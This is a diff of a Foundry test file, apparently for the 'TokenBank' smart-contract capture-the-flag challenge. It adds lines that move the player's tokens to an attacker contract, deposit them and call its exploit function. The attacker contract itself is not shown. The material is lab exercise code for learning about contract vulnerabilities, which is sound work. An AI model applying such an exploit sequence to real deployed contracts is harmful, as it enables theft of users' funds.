@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import "../src/TokenBank.sol";
 
 contract TankBankTest is Test {
@@ -14,6 +15,16 @@ contract TankBankTest is Test {
     function testExploit() public {
         tokenBankChallenge = new TokenBankChallenge(player);
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
+
+        vm.startPrank(player); // transfer tokens from player to tokenBankAttacker
+        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
+        tokenBankChallenge.token().transfer(address(tokenBankAttacker), tokenBankChallenge.token().balanceOf(player));
+        vm.stopPrank();
+
+        // Deposit tokens to the bank
+        tokenBankAttacker.deposit();
+
+        tokenBankAttacker.exploit();
 
         // Put your solution here
 
